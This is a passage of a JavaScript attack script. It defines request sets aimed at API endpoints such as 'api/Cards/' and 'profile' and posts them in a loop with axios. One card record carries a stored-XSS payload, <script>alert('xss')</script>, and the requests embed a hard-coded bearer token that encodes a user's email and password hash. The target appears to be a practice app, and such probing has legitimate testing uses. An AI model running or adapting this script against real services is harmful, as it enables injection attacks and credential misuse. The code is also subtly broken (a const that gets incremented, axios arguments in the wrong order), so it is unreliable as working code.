                "streetAddress": "201, Park Avenue Street, 221b-Bakers Point, London, UK",
                "city": "Pune",
                "state": "MH"
            }
        },
        {
            attack: "api/Cards/",
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json;charset=UTF-8',
                'auth': "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqaGltYW5zY2gxQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNjE3MjE2MmI2YWE0ZTI4MTY0YWQxNzVjODRmZjgwOGEiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Njg1MDAwNDcsImV4cCI6MTY2ODUxODA0N30.o6epkB2cH-u5gHUBBOIpx1T3db7Qdz-cuplZssMZniaol9aIx5OKuzGkF2ReKfFRrj-MG22Htx4tNQPbOMPpBrab2_CfdX2xr4YX7hFBAr_OoVYlfHjBeLIyNlxulwkwno7HskcFiRTOil4I_hbYLXnLuyFeQkJVodYOsTjoVQw"
            },
            data: {
                "fullName": "<script>alert(\"xss\")</script>",
                "cardNum": 9811283292292143,
                "expMonth": "2",
                "expYear": "2080"
            }
        },
        {
            attack: "profile",
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json;charset=UTF-8',
                'auth': "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqaGltYW5zY2gxQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNjE3MjE2MmI2YWE0ZTI4MTY0YWQxNzVjODRmZjgwOGEiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTExLTE1IDA4OjExOjM2LjQwNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2Njg1MDAwNDcsImV4cCI6MTY2ODUxODA0N30.o6epkB2cH-u5gHUBBOIpx1T3db7Qdz-cuplZssMZniaol9aIx5OKuzGkF2ReKfFRrj-MG22Htx4tNQPbOMPpBrab2_CfdX2xr4YX7hFBAr_OoVYlfHjBeLIyNlxulwkwno7HskcFiRTOil4I_hbYLXnLuyFeQkJVodYOsTjoVQw"
            },
            data: {
                username: "Bob"
            }
        }
    ]
}

async function attackendpoint(inputApiSet) {
    const i = 1;
    const start=1;
    for (let req in inputApiSet) {
        if (req === "GET") {
            for (let item of inputApiSet[req]) {
                await axios.get(baseurl + item.attack, item.auth)
                    .then(response => {
                        console.log("response", JSON.parse(response));
                        setTimeout(function () {console.log(''); }, 3000 * start);
                        i + 1;
                    })
                    .catch(error => {
                        console.log("err",i);
                        setTimeout(function () { console.log(''); }, 3000 * start);
                        i + 1;
                    })
               
            }
        } else {
            for (let item of inputApiSet[req]) {
                await axios.post(baseurl + item.attack, item.headers, item.data)
                    .then(response => {
                        // fs.writeFileSync(`getMethodOutput-${k}.json`, JSON.stringify(response.data));
                        // k = k + 1;
                        console.log("succesfull in post req", JSON.parse(response))
                    })
                    .catch(error => {
                        console.log("post error");
                    })
                setTimeout(function () {
                    console.log("")
                }, 200);
            }
        }
    }
}


attackendpoint(inputApiSet);